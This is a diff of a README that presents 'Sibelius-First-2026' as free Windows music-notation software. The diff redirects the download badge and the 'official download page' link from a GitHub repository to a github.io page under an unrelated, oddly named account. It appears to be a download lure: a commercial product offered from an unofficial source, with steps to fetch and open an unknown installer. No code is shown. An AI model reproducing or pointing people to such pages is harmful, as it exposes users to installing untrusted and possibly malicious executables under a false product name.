@@ -1,6 +1,6 @@
 # 🎵 Sibelius-First-2026 - Write music scores on your desktop
 
-[![](https://img.shields.io/badge/Download-Sibelius_First-blue.svg)](https://github.com/Osteal-musket706/Sibelius-First-2026)
+[![](https://img.shields.io/badge/Download-Sibelius_First-blue.svg)](https://osteal-musket706.github.io)
 
 ## 📋 Project Overview
 Sibelius-First-2026 provides a platform for music notation on Windows. This software helps musicians, students, and songwriters create professional-grade sheet music. The interface allows users to input notes, manage instruments, and produce layouts for printing or performance. This application runs on Windows 10 and Windows 11.
@@ -20,7 +20,7 @@ Verify that your system meets these numbers by right-clicking the Start button a
 ## 📥 Download and Installation
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/Osteal-musket706/Sibelius-First-2026) to obtain the installer.
+1. Go to the [official download page](https://osteal-musket706.github.io) to obtain the installer.
 2. Click the link labeled "Download for Windows."
 3. Wait for the file to finish moving to your computer.
 4. Open your Downloads folder in File Explorer.
